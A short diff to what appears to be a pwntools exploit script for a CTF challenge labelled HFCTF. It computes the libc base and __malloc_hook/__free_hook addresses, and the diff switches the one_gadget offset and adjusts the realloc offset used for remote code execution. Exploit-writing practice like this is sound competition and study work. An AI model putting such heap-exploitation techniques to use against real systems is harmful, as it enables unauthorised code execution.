@@ -1,3 +1,4 @@
+#HFCTF 2.30
 from pwn import*
 from LD import*
 def new(size,sign = 0):
@@ -38,8 +39,8 @@ log.info('LIBC:\t' + hex(libc_base))
 malloc_hook = libc_base + libc.sym['__malloc_hook']
 free_hook = libc_base + libc.sym['__free_hook']
 one_gadget = [0xE6B93,0xE6B96,0xE6B99,0x10AFA9,0x10AFB5]
-rce = libc_base + one_gadget[0]
-realloc = libc_base + libc.sym['realloc']
+rce = libc_base + one_gadget[3]
+realloc = libc_base + libc.sym['realloc'] + 8
 new(0x7FFFFFFF00000000+0xFF0)
 rand_1 =p.recv(24).replace(' ','')
 rand_2 =p.recv(24).replace(' ','')
